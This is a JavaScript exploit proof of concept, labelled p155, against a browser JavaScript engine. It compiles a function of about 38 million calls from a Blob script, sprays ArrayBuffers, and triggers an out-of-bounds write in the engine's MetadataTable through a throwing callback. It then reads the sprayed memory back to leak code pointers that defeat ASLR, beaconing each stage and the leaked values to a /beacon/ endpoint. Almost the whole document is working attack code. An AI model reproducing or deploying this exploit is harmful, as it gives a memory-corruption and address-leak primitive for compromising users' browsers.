// p155 — MetadataTable overflow ASLR leak via LAZY CodeBlock
//
// KEY INSIGHT: finishCreation() OOB sweep runs on FIRST CALL, not compilation.
// So: compile, spray, THEN call with throwing callback.
// Spray ends up at HIGHER addresses than MetadataTable → sweep hits it.
//
// Beacon prefix: V155-

(function() {
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var u = '/beacon/V155-' + tag;
      if (body) u += '/' + encodeURIComponent(String(body).substring(0, 600));
      x.open('POST', u + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V155-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function readHex8(view, off) {
    var hex = '';
    for (var h = 7; h >= 0; h--) hex += hexByte(view[off + h]);
    return hex;
  }
  function readU32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }
  function anyNonZero(view, off, len) {
    for (var b = 0; b < len; b++) { if (view[off + b] !== 0) return true; }
    return false;
  }

  BS('BOOT');

  // Phase 1: Compile 38M function FIRST (no OOB writes yet — lazy CodeBlock)
  var N = 38348816;
  BS('BUILD-N' + N);

  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__p155fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__p155ok=1;';
  callChunk = null;

  var blob = new Blob(parts, { type: 'application/javascript' });
  var blobMB = Math.round(blob.size / 1048576);
  BS('BLOB-' + blobMB + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  sc.onload = function() {
    var ok = window.__p155ok ? 'OK' : 'FAIL';
    BS('COMPILED-' + ok);
    if (ok === 'OK') setTimeout(phaseSprayAndCall, 50);
    else BS('DONE');
  };
  document.head.appendChild(sc);
  sc.src = url;

  function phaseSprayAndCall() {
    // Phase 2: Spray AFTER compilation — these go to HIGHER addresses
    var BUF_SZ = 100112;
    var SPRAY_COUNT = 400;
    var sprays = [];
    var views = [];

    BS('SPRAY-START');
    for (var i = 0; i < SPRAY_COUNT; i++) {
      var ab = new ArrayBuffer(BUF_SZ);
      sprays.push(ab);
      views.push(new Uint8Array(ab));
    }
    BS('SPRAY-' + SPRAY_COUNT + '-SZ' + BUF_SZ);

    // Phase 3: CALL the function with a throwing callback
    // This triggers lazy CodeBlock creation → finishCreation() → OOB sweep
    // The throwing callback stops execution after the first op_call
    // finishCreation writes ALL 38M entries BEFORE any execution
    BS('CALLING');
    var callOK = false;
    try {
      window.__p155fn(function() { throw new Error('p155stop'); });
    } catch (e) {
      callOK = true;
      BS('THREW-' + (e.message || '').substring(0, 20));
    }
    if (!callOK) {
      BS('CALL-NO-THROW');
    }

    // Phase 4: Scan spray buffers for OOB writes
    setTimeout(function() { phaseScan(views, sprays); }, 100);
  }

  function phaseScan(views, sprays) {
    BS('SCAN-START');

    var hitBufs = 0;
    var totalNZ = 0;
    var leakedPtrs = [];

    for (var i = 0; i < views.length; i++) {
      var view = views[i];
      if (!view) continue;

      var nz = 0;
      var firstOff = -1;
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0) {
          if (firstOff === -1) firstOff = j;
          nz++;
        }
      }

      if (nz > 0) {
        hitBufs++;
        totalNZ += nz;
        if (hitBufs <= 5) {
          BS('HIT-' + i + '-nz' + nz + '-f' + firstOff);
        }

        // Find 112-byte stride alignment
        var entryBase = firstOff - (firstOff % 112);

        // Scan for thunk pointer at entry+24
        var ptrsDumped = 0;
        for (var entryOff = entryBase; entryOff + 72 <= view.length && ptrsDumped < 10; entryOff += 112) {
          var ptrOff = entryOff + 24;
          if (ptrOff + 8 > view.length) break;
          if (!anyNonZero(view, ptrOff, 8)) continue;

          var hex = readHex8(view, ptrOff);
          var entryN = Math.round((entryOff - entryBase) / 112);
          B('THUNK-B' + i + '-N' + entryN + '-O' + ptrOff + '=' + hex);
          ptrsDumped++;
          if (leakedPtrs.length < 5) leakedPtrs.push(hex);
        }

        // Check m_slowPathCount and m_bytecodeIndex
        var diagDumped = 0;
        for (var entryOff = entryBase; entryOff + 72 <= view.length && diagDumped < 5; entryOff += 112) {
          var entryN = Math.round((entryOff - entryBase) / 112);
          var cntOff = entryOff + 12;
          if (cntOff + 4 <= view.length) {
            var cnt = readU32(view, cntOff);
            if (cnt === 0xFFFFFFFF) {
              B('CNT-FFFFFFFF-N' + entryN);
              diagDumped++;
            }
          }
          var idxOff = entryOff + 68;
          if (idxOff + 4 <= view.length) {
            var val = readU32(view, idxOff);
            if (val > 800 && val < 40000000) {
              B('IDX-N' + entryN + '=' + val);
              diagDumped++;
            }
          }
        }

        // Raw dump first 512 bytes of first hit
        if (hitBufs === 1) {
          var chunks = '';
          var cc = 0;
          for (var off = firstOff; off + 8 <= view.length && cc < 20; off += 8) {
            if (anyNonZero(view, off, 8)) {
              chunks += off + ':' + readHex8(view, off) + ' ';
              cc++;
            }
          }
          if (cc > 0) B('RAW-' + i, chunks.trim());
        }
      }
    }

    BS('RESULT-bufs' + hitBufs + '-nz' + totalNZ + '-total' + views.length);

    if (hitBufs > 0 && leakedPtrs.length > 0) {
      BS('ASLR-LEAK');
      for (var p = 0; p < leakedPtrs.length; p++) {
        B('PTR' + p + '=' + leakedPtrs[p]);
      }
    } else {
      BS('NO-LEAK');
    }

    BS('DONE');
  }
})();
